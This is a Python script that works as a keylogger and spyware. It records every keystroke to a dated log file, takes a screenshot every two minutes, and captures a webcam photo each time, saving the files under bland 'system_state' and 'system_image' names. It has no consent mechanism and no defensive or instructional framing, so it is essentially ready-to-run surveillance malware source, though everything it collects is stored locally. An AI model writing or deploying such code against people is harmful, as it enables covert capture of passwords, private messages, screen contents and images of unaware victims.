from pynput import keyboard
from datetime import datetime
from pyautogui import screenshot
import threading
from cv2 import VideoCapture, imwrite


def on_press(key):
    try:
        # Write the character representation of the key to the file
        log_file.write(f'{key.char}\n')
        log_file.flush()  # Ensure the data is written to the file immediately
    except AttributeError:
        # Handle special keys (like Shift, Ctrl, etc.)
        log_file.write(f' Special key {key} pressed\n')
        log_file.flush()

def on_release(key):
    log_file.write(f'Key released {key}\n')
    log_file.flush()
    # Stop listener if the ESC key is pressed
    if key == keyboard.Key.esc:
        end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f'Session ended at: {end_time}\n')
        log_file.close()  # Close the log file
        log_file.close()  # Close the log file
        return False

def take_picture (imageName):
    # Open the camera
    cap = VideoCapture(0)

    # Capture a single frame
    ret, frame = cap.read()
    if not ret:
        raise Exception("Failed to capture image")
    
    # Save the image
    imwrite(imageName, frame)
    
    # Release the camera
    cap.release()

def take_screenshot():
    # Capture the screenshot
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"system_state_{timestamp}.png"
    imageName = f"system_image_{timestamp}.png"
    
    screenshot(filename)
    try: 
        take_picture(imageName)
    except Exception as e:
        print(f"Error: {e}")
    
    # Schedule the next screenshot
    try: 
        threading.Timer(120, take_screenshot).start()
    except Exception as e:
        threading.Timer(120, take_screenshot).start()


# Naming file with todays date
file_name = "system_log" + datetime.now().strftime("%Y_%m_%d")

# Open the log file in append mode
log_file = open(file_name, "a")

# Log the start time
start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
log_file.write(f'\nSession started at: {start_time}\n')
log_file.flush()

try:
    take_screenshot()
except Exception as e:
    print(f"Error: {e}")

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()